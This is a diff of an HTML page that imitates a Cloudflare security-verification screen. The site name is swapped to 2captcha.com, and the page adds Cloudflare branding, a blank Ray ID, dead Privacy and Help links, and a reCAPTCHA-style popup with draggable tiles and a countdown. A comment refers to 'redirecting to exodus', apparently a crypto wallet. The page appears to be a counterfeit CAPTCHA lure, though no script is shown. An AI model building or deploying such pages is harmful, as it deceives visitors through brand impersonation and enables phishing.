@@ -1,812 +1,242 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en-US">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="robots" content="noindex,nofollow">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>Just a moment...</title>
   <meta name="captcha-base-url" content="" id="captcha-base-url">
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-
-    body {
-      background-color: #f5f5f5;
-      color: #1a1a1a;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-      font-size: 16px;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
-      line-height: 1.5;
-    }
-
-    .container {
-      width: 100%;
-      max-width: 960px;
-      padding: 0 24px;
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      box-sizing: border-box;
-      margin-bottom: 130px;
-    }
-
-    .header {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      margin-bottom: 10px;
-    }
-
-    .header-logo-wrap {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      width: 36px;
-      height: 36px;
-      flex-shrink: 0;
-    }
-
-    .header-logo {
-      width: 36px;
-      height: 36px;
-      object-fit: contain;
-      display: block;
-    }
-
-    .header-logo-fallback {
-      font-size: 36px;
-      line-height: 1;
-      display: none;
-    }
-
-    .robot-emoji {
-      font-size: 36px;
-      line-height: 1;
-      filter: grayscale(0.1);
-    }
-
-    .site-name {
-      font-size: 40px;
-      font-weight: 600;
-      color: #1a1a1a;
-
-      line-height: 1.2;
-    }
-
-    .title {
-    line-height: 125%;
-    font-size: 1.5rem;
-    font-weight: 600;
-    font-style: normal;
-    margin-bottom: 8px;
-    }
-
-    .description {
-      font-size: 1.1rem;
-      font-weight: 400;
-      color: #555;
-      line-height: 150%;
-      margin-bottom: 2rem;
-
-    }
-
-    .captcha-box {
-      width: 100%;
-      max-width: 360px;
-      border: 1px solid #d0d0d0;
-      border-radius: 0px;
-      background: #efeeee;
-      box-shadow: 0 1px 2px rgba(0,0,0,0.04), 0 0 0 1px rgba(0,0,0,0.02);
-      display: flex;
-      flex-direction: row;
-      align-items: center;
-      justify-content: space-between;
-      padding: 14px 16px;
-      cursor: pointer;
-      transition: border-color 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
-    }
-
-    .captcha-box:hover {
-      border-color: #b0b0b0;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.06), 0 0 0 1px rgba(0,0,0,0.04);
-      background: #fafafa;
-    }
-
-    .captcha-box:focus {
-      outline: none;
-    }
-
-    .captcha-box:focus-visible {
-      outline: 2px solid #f38020;
-      outline-offset: 2px;
-      border-color: #f38020;
-    }
-
-    /* Left column: checkbox+text OR spinner/success - one visible at a time */
-    .captcha-widget-default {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      min-width: 0;
-      overflow: hidden;
-    }
-
-    .captcha-box.verify-active .captcha-left { display: none !important; }
-    .captcha-box.verify-active .verify-status { display: flex !important; }
-
-    .captcha-left {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-
-    /* Hidden real checkbox, custom visible one */
-    .real-checkbox {
-      position: absolute;
-      opacity: 0;
-      width: 0;
-      height: 0;
-      pointer-events: none;
-    }
-
-    .checkbox {
-      width: 20px;
-      height: 20px;
-      border: 2px solid #8c8c8c;
-      border-radius: 3px;
-      background: #fff;
-      flex-shrink: 0;
-      position: relative;
-      transition: border-color 0.2s ease, background 0.2s ease, box-shadow 0.15s ease;
-    }
-
-    .checkbox.checked {
-      background: #22c55e;
-      border-color: #22c55e;
-      box-shadow: inset 0 0 0 1px rgba(0,0,0,0.05);
-    }
-
-    .checkbox.checked::after {
-      content: "";
-      position: absolute;
-      left: 5px;
-      top: 2px;
-      width: 5px;
-      height: 10px;
-      border: solid #fff;
-      border-width: 0 2px 2px 0;
-      transform: rotate(45deg);
-    }
-
-    .verify-text {
-      font-size: 15px;
-      font-weight: 500;
-      color: #1a1a1a;
-      letter-spacing: 0;
-    }
-
-    .cloudflare-brand {
-      display: flex;
-      flex-direction: column;
-      align-items: flex-end;
-      gap: 2px;
-    }
-
-    .cloudflare-logo {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .cf-logo-img {
-      height: px40;
-      width: auto;
-      max-width: 92px;
-      object-fit: contain;
-      display: block;
-    }
-
-    .cf-text {
-      font-size: 9px;
-      font-weight: 700;
-      color: #4a4a4a;
-      letter-spacing: 0.12em;
-      text-transform: uppercase;
-    }
-
-    .cf-links {
-      display: flex;
-      align-items: center;
-      gap: 1px;
-      font-size: 11px;
-      font-weight: 500;
-    }
-
-    .cf-links a {
-      text-decoration: none;
-    }
-
-    .cf-link {
-      color: #090a0a;
-    }
-
-    .cf-link2 {
-      color: #1a1a1a;
-    }
-
-    .cf-links a:hover {
-      text-decoration: underline;
-    }
-
-    .cf-link:hover {
-      color: #0a58ca;
-    }
-
-    .cf-link2:hover {
-      color: #000;
-    }
-
-    .footer {
-      width: 100%;
-      border-top: 1px solid #e5e5e5;
-      padding: 20px 24px 28px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 2px;
-      font-size: 0.75rem;
-      font-weight: 500;
-      background: #fafafa;
-      color: #6b7280;
-      letter-spacing: 0.01em;
-      text-align: center;
-    }
-
-    .footer .footer-line-1 {
-      color: #6b7280;
-    }
-
-    .footer .footer-line-2 {
-      color: #6b7280;
-    }
-
-    .footer a {
-      color: #0004ff;
-      text-decoration: underline;
-    }
-
-    .footer a:hover {
-      text-decoration: underline;
-      opacity: 0.9;
-    }
-
-    .ray-id { color: #6b7280; font-weight: 700; }
-
-    .captcha-popup-overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.5);
-      backdrop-filter: blur(1px);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 1000;
-      padding: 20px;
-      overflow-y: auto;
-    }
-    .captcha-popup-overlay.hidden { display: none !important; }
-
-    .challenge-popup {
-      background: #fff;
-      border-radius: 4px;
-      width: 100%;
-      max-width: 400px;
-      max-height: calc(100vh - 40px);
-      overflow-y: auto;
-      overflow-x: hidden;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.07), 0 10px 40px rgba(0,0,0,0.15), 0 0 0 1px rgba(0,0,0,0.05);
-      border: 1px solid #dadce0;
-      font-family: Roboto, "Helvetica Neue", Arial, sans-serif;
-      margin: auto;
-    }
-
-    .captcha-box-inner { padding: 0; }
-    .challenge-stage { display: block; }
-    .challenge-stage.hidden { display: none !important; }
-
-    /* Blue header – reCAPTCHA-style */
-    .challenge-banner {
-      background: #4285f4;
-      color: rgba(255,255,255,0.9);
-      padding: 18px 20px 16px;
-      font-size: 14px;
-      font-weight: 400;
-      line-height: 1.4;
-    }
-    .challenge-banner strong {
-      display: block;
-      font-size: 22px;
-      font-weight: 700;
-      color: #fff;
-      margin-top: 4px;
-      line-height: 1.2;
-    }
-    .challenge-banner .banner-line1 { font-size: 14px; font-weight: 400; color: rgba(255,255,255,0.95); }
-    .challenge-banner .banner-line2 { display: block; font-size: 22px; font-weight: 700; color: #fff; margin-top: 4px; line-height: 1.2; }
-
-    /* 3×3 photo grid – tiny white gaps like reCAPTCHA */
-    .challenge-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 3px;
-      background: #fff;
-    }
-
-    .challenge-tile {
-      position: relative;
-      aspect-ratio: 1;
-      overflow: hidden;
-      cursor: default;
-      user-select: none;
-      background: #f5f5f5;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .tile-img {
-      width: 70%;
-      height: 70%;
-      object-fit: contain;
-      pointer-events: none;
-      display: block;
-    }
-
-    .tile-char {
-      font-size: 56px;
-      font-weight: 800;
-      color: #444;
-      line-height: 1;
-      pointer-events: none;
-      font-family: 'Arial Black', 'Impact', Arial, sans-serif;
-    }
-
-    .challenge-tile.draggable {
-      cursor: grab;
-      outline: 3px solid #4285f4;
-      outline-offset: -3px;
-      background: #e8f0fe;
-    }
-    .challenge-tile.draggable:active { cursor: grabbing; }
-
-    .drag-layer {
-      position: absolute;
-      inset: 0;
-      z-index: 2;
-      text-decoration: none;
-      cursor: grab;
-    }
-    .drag-layer:active { cursor: grabbing; }
-
-    .banner-hint {
-      display: block;
-      font-size: 11px;
-      font-weight: 400;
-      color: rgba(255,255,255,0.72);
-      margin-top: 6px;
-      letter-spacing: 0.01em;
-    }
-
-    /* Stage 2 */
-    .challenge-stage2-body {
-      background: #f9f9f9;
-      padding: 40px 24px 36px;
-      text-align: center;
-      min-height: 230px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-    }
-    .click-counter-line { font-size: 14px; color: #555; margin: 0; }
-    .click-counter-line strong {
-      display: block;
-      font-size: 68px;
-      font-weight: 700;
-      color: #4285f4;
-      line-height: 1;
-      margin-bottom: 6px;
-    }
-    .click-counter-sub { font-size: 12px; color: #888; max-width: 260px; }
-    .timer-line { font-size: 14px; color: #555; margin: 8px 0 0; }
-    .timer-line.warning { color: #ff9800; font-weight: 600; }
-    .timer-line.critical { color: #d32f2f; font-weight: 700; animation: pulse-red 0.6s infinite; }
-    @keyframes pulse-red { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
-    .timer-line:not(.hidden) { display: block; }
-
-    /* Footer – reCAPTCHA */
-    .rc-footer {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 12px 16px;
-      background: #f9f9f9;
-      border-top: 1px solid #e0e0e0;
-    }
-    .rc-footer-icons { display: flex; align-items: center; gap: 16px; }
-    .rc-icon-btn {
-      background: none;
-      border: none;
-      cursor: pointer;
-      padding: 4px;
-      color: #888;
-      display: flex;
-      align-items: center;
-      transition: color 0.15s;
-    }
-    .rc-icon-btn:hover { color: #333; }
-    .rc-verify-btn {
-      background: #4285f4;
-      color: #fff;
-      border: none;
-      border-radius: 4px;
-      padding: 10px 26px;
-      font-size: 14px;
-      font-weight: 600;
-      letter-spacing: 0.05em;
-      cursor: pointer;
-      transition: background 0.15s;
-    }
-    .rc-verify-btn:hover { background: #3367d6; }
-
-    .hidden { display: none !important; }
-
-    /* Verify flow: left column only - Cloudflare stays on right */
-    .verify-status {
-      display: none;
-      align-items: center;
-      justify-content: flex-start;
-      gap: 12px;
-      box-sizing: border-box;
-      min-width: 0;
-      overflow: hidden;
-    }
-    .verify-status:not(.hidden) { display: flex; }
-    .verify-status.hidden { display: none !important; }
-    .captcha-box.verify-active .verify-status { display: flex !important; }
-    .captcha-box.verify-active .captcha-left { display: none !important; }
-    .verify-spinner {
-      width: 22px;
-      height: 22px;
-      position: relative;
-      flex-shrink: 0;
-      animation: verify-spinner-rotate 1.5s linear infinite;
-    }
-    .verify-spinner-dot {
-      position: absolute;
-      width: 4px;
-      height: 4px;
-      border-radius: 50%;
-      background: #0d6efd;
-      top: 50%;
-      left: 50%;
-      margin-top: -2px;
-      margin-left: -2px;
-    }
-    .verify-spinner-dot:nth-child(1) { transform: translateY(-9px); }
-    .verify-spinner-dot:nth-child(2) { transform: translate(6.4px, -6.4px); }
-    .verify-spinner-dot:nth-child(3) { transform: translateX(9px); }
-    .verify-spinner-dot:nth-child(4) { transform: translate(6.4px, 6.4px); }
-    .verify-spinner-dot:nth-child(5) { transform: translateY(9px); }
-    .verify-spinner-dot:nth-child(6) { transform: translate(-6.4px, 6.4px); }
-    .verify-spinner-dot:nth-child(7) { transform: translateX(-9px); }
-    .verify-spinner-dot:nth-child(8) { transform: translate(-6.4px, -6.4px); }
-    @keyframes verify-spinner-rotate {
-      to { transform: rotate(360deg); }
-    }
-    .verify-status-text {
-      color: #1a1a1a;
-      font-size: 15px;
-      font-weight: 500;
-      letter-spacing: 0;
-    }
-    .verify-status-text.hidden { display: none !important; }
-    .verify-success {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      color: #166534;
-      font-size: 15px;
-      font-weight: 600;
-      letter-spacing: 0;
-      min-width: 0;
-      flex: 1;
-    }
-    .verify-success.hidden { display: none !important; }
-    .verify-success-icon {
-      width: 22px;
-      height: 22px;
-      background: #22c55e;
-      color: #fff;
-      border-radius: 50%;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 13px;
-      font-weight: 700;
-      flex-shrink: 0;
-    }
-
-    .verify-success-cf-logo {
-      height: 18px;
-      max-height: 18px;
-      width: auto;
-      max-width: 80px;
-      object-fit: contain;
-      object-position: left center;
-      margin-left: 6px;
-      flex-shrink: 1;
-      display: block;
-    }
-
-    .verify-success-msg {
-      font-size: 17px;
-      font-weight: 600;
-      color: #1a1a1a;
-      margin-bottom: 28px;
-      line-height: 1.5;
-      max-width: 100%;
-    }
-    .verify-success-msg.hidden { display: none !important; }
-
-    .captcha-widget-wrap.hidden { display: none !important; }
-
-    /* Initial load: same box as widget, only left content is spinner + Verifying... */
-    .initial-load-screen {
-      width: 100%;
-      max-width: 360px;
-      border: 1px solid #d0d0d0;
-      border-radius: 0px;
-      background: #efeeee;
-      box-shadow: 0 1px 2px rgba(0,0,0,0.04), 0 0 0 1px rgba(0,0,0,0.02);
-      display: flex;
-      flex-direction: row;
-      align-items: center;
-      justify-content: space-between;
-      padding: 14px 16px;
-      box-sizing: border-box;
-    }
-    .initial-load-screen .initial-load-left {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      min-width: 0;
-    }
-    .initial-load-screen.hidden { display: none !important; }
-
-    /* Completing overlay - shown when redirecting to exodus */
-    .captcha-completing-overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(255,255,255,0.95);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-      backdrop-filter: blur(2px);
-    }
-    .completing-spinner {
-      width: 40px;
-      height: 40px;
-      position: relative;
-      margin-bottom: 20px;
-      animation: completing-spin 1.2s linear infinite;
-    }
-    .completing-spinner .spinner-dot {
-      position: absolute;
-      width: 8px;
-      height: 8px;
-      border-radius: 50%;
-      background: #4285f4;
-      top: 50%;
-      left: 50%;
-      margin-top: -4px;
-      margin-left: -4px;
-    }
-    .completing-spinner .spinner-dot:nth-child(1) { transform: translateY(-16px); animation: pulse 1.2s ease-in-out infinite; }
-    .completing-spinner .spinner-dot:nth-child(2) { transform: translate(11px, -11px); animation: pulse 1.2s ease-in-out 0.2s infinite; }
-    .completing-spinner .spinner-dot:nth-child(3) { transform: translateX(16px); animation: pulse 1.2s ease-in-out 0.4s infinite; }
-    .completing-spinner .spinner-dot:nth-child(4) { transform: translate(11px, 11px); animation: pulse 1.2s ease-in-out 0.6s infinite; }
-    @keyframes completing-spin { to { transform: rotate(360deg); } }
-    @keyframes pulse { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
-    .captcha-completing-overlay p {
-      font-size: 16px;
-      font-weight: 500;
-      color: #333;
-      letter-spacing: 0.02em;
-    }
+    *{box-sizing:border-box;margin:0;padding:0}
+    html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji"}
+    body{display:flex;flex-direction:column;height:100vh;min-height:100vh}
+    .main-wrapper{flex:1;display:flex;flex-direction:column;min-height:0}
+    .main-content{margin:12rem auto;padding-left:1.5rem;padding-right:1.5rem;max-width:60rem;width:100%;flex:1}
+    @media (width <= 720px){.main-content{margin-top:4rem}}
+    #challenge-error-text{background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+");background-repeat:no-repeat;background-size:contain;padding-left:34px}
   </style>
 </head>
 <body>
+  <div class="main-wrapper" role="main">
+    <div class="main-content">
+      <noscript>
+        <div class="h2"><span id="challenge-error-text">Enable JavaScript and cookies to continue</span></div>
+      </noscript>
 
-  <div class="container">
-    <div class="header">
-      <div class="header-logo-wrap">
-        <img src="assets/round-bottom-flask.png" alt="" class="header-logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
-        <span class="header-logo-fallback robot-emoji" aria-hidden="true">🤖</span>
-      </div>
-      <span class="site-name">www.scrapingcourse.com</span>
-    </div>
+      <h1 style="font-size:2rem;font-weight:600;margin-bottom:0.5rem;">2captcha.com</h1>
+      <h2 style="font-size:1.5rem;font-weight:600;margin-bottom:0.5rem;">Performing security verification</h2>
+      <p style="margin-bottom:1rem;">This website uses a security service to protect against malicious bots. This page is displayed while the website verifies you are not a bot.</p>
+      <p class="verify-success-msg hidden" id="verify-success-msg" style="margin-bottom:1rem;"><strong>Verification successful. Waiting for <span id="verify-success-host">2captcha.com</span> to respond.</strong></p>
 
-    <h2 class="title">Performing security verification</h2>
-    <p class="description">
-      This website uses a security service to protect against malicious bots. This page is displayed while the website verifies you are not a bot.
-    </p>
+      <div id="AOzYg6" style="display: grid;">
+        <div><div><input type="hidden" name="cf-turnstile-response" id="cf-chl-widget-ax32n_response"></div></div>
 
-    <p class="verify-success-msg hidden" id="verify-success-msg">
-      <strong>Verification successful. Waiting for <span id="verify-success-host">backstage.io</span> to respond.</strong>
-    </p>
+        <style>
+          /* Turnstile widget / main-wrapper .hhfk3 theme-light size-normal lang-en-us */
+          .cf-widget-container { width: 100%; max-width: 360px; }
+          .captcha-box {
+            width: 100%; border: 1px solid #d0d0d0; border-radius: 0; background: #efeeee;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.04), 0 0 0 1px rgba(0,0,0,0.02);
+            display: flex; flex-direction: row; align-items: center; justify-content: space-between;
+            padding: 14px 16px; cursor: pointer;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
+          }
+          .captcha-box:hover { border-color: #b0b0b0; background: #fafafa; }
+          .captcha-box:focus { outline: none; }
+          .captcha-box:focus-visible { outline: 2px solid #f38020; outline-offset: 2px; border-color: #f38020; }
+          .captcha-widget-default { display: flex; align-items: center; gap: 12px; min-width: 0; overflow: hidden; }
+          .captcha-box.verify-active .captcha-left { display: none !important; }
+          .captcha-box.verify-active .verify-status { display: flex !important; }
+          .captcha-left { display: flex; align-items: center; gap: 12px; }
+          .real-checkbox { position: absolute; opacity: 0; width: 0; height: 0; pointer-events: none; }
+          .checkbox {
+            width: 20px; height: 20px; border: 2px solid #8c8c8c; border-radius: 3px; background: #fff;
+            flex-shrink: 0; position: relative; transition: border-color 0.2s ease, background 0.2s ease, box-shadow 0.15s ease;
+          }
+          .checkbox.checked { background: #22c55e; border-color: #22c55e; box-shadow: inset 0 0 0 1px rgba(0,0,0,0.05); }
+          .checkbox.checked::after {
+            content: ""; position: absolute; left: 5px; top: 2px; width: 5px; height: 10px;
+            border: solid #fff; border-width: 0 2px 2px 0; transform: rotate(45deg);
+          }
+          .verify-text { font-size: 15px; font-weight: 500; color: #1a1a1a; }
+          .cloudflare-brand { display: flex; flex-direction: column; align-items: flex-end; gap: 2px; }
+          .cloudflare-logo { display: flex; align-items: center; gap: 6px; }
+          .cf-logo-img { height: 40px; width: auto; max-width: 92px; object-fit: contain; display: block; }
+          .cf-links { display: flex; align-items: center; gap: 4px; font-size: 11px; font-weight: 500; }
+          .cf-links a { text-decoration: none; color: #090a0a; }
+          .cf-links a:hover { text-decoration: underline; }
+          .verify-status { display: none; align-items: center; justify-content: flex-start; gap: 12px; min-width: 0; overflow: hidden; }
+          .verify-status:not(.hidden) { display: flex; }
+          .verify-status.hidden { display: none !important; }
+          .verify-spinner { width: 22px; height: 22px; position: relative; flex-shrink: 0; animation: verify-spinner-rotate 1.5s linear infinite; }
+          .verify-spinner-dot { position: absolute; width: 4px; height: 4px; border-radius: 50%; background: #0d6efd; top: 50%; left: 50%; margin-top: -2px; margin-left: -2px; }
+          .verify-spinner-dot:nth-child(1){transform:translateY(-9px)} .verify-spinner-dot:nth-child(2){transform:translate(6.4px,-6.4px)} .verify-spinner-dot:nth-child(3){transform:translateX(9px)} .verify-spinner-dot:nth-child(4){transform:translate(6.4px,6.4px)} .verify-spinner-dot:nth-child(5){transform:translateY(9px)} .verify-spinner-dot:nth-child(6){transform:translate(-6.4px,6.4px)} .verify-spinner-dot:nth-child(7){transform:translateX(-9px)} .verify-spinner-dot:nth-child(8){transform:translate(-6.4px,-6.4px)}
+          @keyframes verify-spinner-rotate { to { transform: rotate(360deg); } }
+          .verify-status-text { color: #1a1a1a; font-size: 15px; font-weight: 500; }
+          .verify-success { display: flex; align-items: center; gap: 10px; color: #166534; font-size: 15px; font-weight: 600; min-width: 0; flex: 1; }
+          .verify-success.hidden { display: none !important; }
+          .verify-success-icon { width: 22px; height: 22px; background: #22c55e; color: #fff; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 700; flex-shrink: 0; }
+          .initial-load-screen { width: 100%; max-width: 360px; border: 1px solid #d0d0d0; border-radius: 0; background: #efeeee; box-shadow: 0 1px 2px rgba(0,0,0,0.04); display: flex; flex-direction: row; align-items: center; justify-content: space-between; padding: 14px 16px; box-sizing: border-box; }
+          .initial-load-screen .initial-load-left { display: flex; align-items: center; gap: 12px; min-width: 0; }
+          .initial-load-screen.hidden { display: none !important; }
+          .captcha-widget-wrap.hidden { display: none !important; }
+          .hidden { display: none !important; }
+          .footer { width: 100%; max-width: 60rem; margin-left: auto; margin-right: auto; border-top: 1px solid #e5e5e5; padding: 20px 24px 28px; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 2px; font-size: 0.75rem; font-weight: 500; background: #fafafa; color: #6b7280; text-align: center; margin-top: auto; }
+          .footer a { color: #0004ff; text-decoration: underline; }
+          .ray-id { color: #6b7280; font-weight: 700; }
+          .captcha-popup-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); backdrop-filter: blur(1px); display: flex; align-items: center; justify-content: center; z-index: 1000; padding: 20px; overflow-y: auto; }
+          .captcha-popup-overlay.hidden { display: none !important; }
+          .challenge-popup { background: #fff; border-radius: 4px; width: 100%; max-width: 400px; max-height: calc(100vh - 40px); overflow-y: auto; box-shadow: 0 4px 6px rgba(0,0,0,0.07), 0 10px 40px rgba(0,0,0,0.15); border: 1px solid #dadce0; font-family: Roboto,"Helvetica Neue",Arial,sans-serif; margin: auto; }
+          .captcha-box-inner { padding: 0; }
+          .challenge-stage { display: block; }
+          .challenge-stage.hidden { display: none !important; }
+          .challenge-banner { background: #4285f4; color: rgba(255,255,255,0.9); padding: 18px 20px 16px; font-size: 14px; font-weight: 400; line-height: 1.4; }
+          .challenge-banner strong { display: block; font-size: 22px; font-weight: 700; color: #fff; margin-top: 4px; line-height: 1.2; }
+          .challenge-banner .banner-line1 { font-size: 14px; font-weight: 400; color: rgba(255,255,255,0.95); }
+          .challenge-banner .banner-line2 { display: block; font-size: 22px; font-weight: 700; color: #fff; margin-top: 4px; line-height: 1.2; }
+          .challenge-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 3px; background: #fff; }
+          .challenge-tile { position: relative; aspect-ratio: 1; overflow: hidden; cursor: default; user-select: none; background: #f5f5f5; display: flex; align-items: center; justify-content: center; }
+          .tile-img { width: 70%; height: 70%; object-fit: contain; pointer-events: none; display: block; }
+          .challenge-tile.draggable { cursor: grab; outline: 3px solid #4285f4; outline-offset: -3px; background: #e8f0fe; }
+          .challenge-tile.draggable:active { cursor: grabbing; }
+          .drag-layer { position: absolute; inset: 0; z-index: 2; text-decoration: none; cursor: grab; }
+          .drag-layer:active { cursor: grabbing; }
+          .rc-footer { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; background: #f9f9f9; border-top: 1px solid #e0e0e0; }
+          .rc-footer-icons { display: flex; align-items: center; gap: 16px; }
+          .rc-icon-btn { background: none; border: none; cursor: pointer; padding: 4px; color: #888; display: flex; align-items: center; }
+          .rc-verify-btn { background: #4285f4; color: #fff; border: none; border-radius: 4px; padding: 10px 26px; font-size: 14px; font-weight: 600; cursor: pointer; }
+          .rc-verify-btn:hover { background: #3367d6; }
+          .challenge-stage2-body { background: #f9f9f9; padding: 40px 24px 36px; text-align: center; min-height: 230px; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 10px; }
+          .click-counter-line { font-size: 14px; color: #555; margin: 0; }
+          .click-counter-line strong { display: block; font-size: 68px; font-weight: 700; color: #4285f4; line-height: 1; margin-bottom: 6px; }
+          .click-counter-sub { font-size: 12px; color: #888; max-width: 260px; }
+          .timer-line { font-size: 14px; color: #555; margin: 8px 0 0; }
+          .timer-line.warning { color: #ff9800; font-weight: 600; }
+          .timer-line.critical { color: #d32f2f; font-weight: 700; animation: pulse-red 0.6s infinite; }
+          @keyframes pulse-red { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
+          .captcha-completing-overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.95); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; backdrop-filter: blur(2px); }
+          .completing-spinner { width: 40px; height: 40px; position: relative; margin-bottom: 20px; animation: completing-spin 1.2s linear infinite; }
+          .completing-spinner .spinner-dot { position: absolute; width: 8px; height: 8px; border-radius: 50%; background: #4285f4; top: 50%; left: 50%; margin-top: -4px; margin-left: -4px; }
+          .completing-spinner .spinner-dot:nth-child(1){transform:translateY(-16px)} .completing-spinner .spinner-dot:nth-child(2){transform:translate(11px,-11px)} .completing-spinner .spinner-dot:nth-child(3){transform:translateX(16px)} .completing-spinner .spinner-dot:nth-child(4){transform:translate(11px,11px)}
+          @keyframes completing-spin { to { transform: rotate(360deg); } }
+          .captcha-completing-overlay p { font-size: 16px; font-weight: 500; color: #333; }
+        </style>
 
-    <div class="initial-load-screen" id="initial-load-screen">
-      <div class="initial-load-left">
-        <div class="verify-spinner">
-          <span class="verify-spinner-dot"></span>
-          <span class="verify-spinner-dot"></span>
-          <span class="verify-spinner-dot"></span>
-          <span class="verify-spinner-dot"></span>
-          <span class="verify-spinner-dot"></span>
-          <span class="verify-spinner-dot"></span>
-          <span class="verify-spinner-dot"></span>
-          <span class="verify-spinner-dot"></span>
-        </div>
-        <span class="verify-status-text">Verifying...</span>
-      </div>
-      <div class="cloudflare-brand">
-        <div class="cloudflare-logo">
-          <img src="assets/Cloudflare-logo.png" alt="Cloudflare" class="cf-logo-img">
-        </div>
-        <div class="cf-links">
-          <a class="cf-link" href="#" onclick="return false;">Privacy</a>
-          <span class="cf-link-separator">•</span>
-          <a class="cf-link2" href="#" onclick="return false;">Help</a>
-        </div>
-      </div>
-    </div>
-
-    <div class="captcha-widget-wrap hidden" id="captcha-widget-wrap">
-    <div class="captcha-box" id="captcha-widget" role="button" tabindex="0" aria-label="Verify you are human">
-      <div class="captcha-widget-default" id="captcha-widget-default">
-        <div class="captcha-left">
-          <input type="checkbox" id="robotCheckbox" class="real-checkbox">
-          <div class="checkbox" id="visibleCheckbox"></div>
-          <span class="verify-text">Verify you are human</span>
-        </div>
-        <div class="verify-status hidden" id="verify-status">
-          <div class="verify-spinner" id="verify-spinner">
-            <span class="verify-spinner-dot"></span>
-            <span class="verify-spinner-dot"></span>
-            <span class="verify-spinner-dot"></span>
-            <span class="verify-spinner-dot"></span>
-            <span class="verify-spinner-dot"></span>
-            <span class="verify-spinner-dot"></span>
-            <span class="verify-spinner-dot"></span>
-            <span class="verify-spinner-dot"></span>
-          </div>
-          <span class="verify-status-text" id="verify-status-text">Verifying...</span>
-          <div class="verify-success hidden" id="verify-success">
-            <span class="verify-success-icon">✓</span>
-            <span class="verify-success-text">Success!</span>
-          </div>
-        </div>
-      </div>
-      <div class="cloudflare-brand">
-        <div class="cloudflare-logo">
-          <img src="assets/Cloudflare-logo.png" alt="Cloudflare" class="cf-logo-img">
-        </div>
-        <div class="cf-links">
-          <a class="cf-link" href="#" onclick="return false;">Privacy</a>
-          <span class="cf-link-separator">•</span>
-          <a class="cf-link2" href="#" onclick="return false;">Help</a>
-        </div>
-      </div>
-    </div>
-  </div>
-  </div>
-
-  <div class="footer">
-    <div class="footer-line-1">
-      <span class="ray-id">Ray ID: <span id="cf-ray-id"></span></span>
-    </div>
-    <div class="footer-line-2">
-      Performance and Security by <a href="https://www.cloudflare.com" target="_blank">Cloudflare</a> | <a href="#" onclick="return false;">Privacy</a>
-    </div>
-  </div>
-
-  <!-- reCAPTCHA-style challenge popup -->
-  <div class="captcha-popup-overlay hidden" id="challenge-popup-overlay">
-    <div class="challenge-popup">
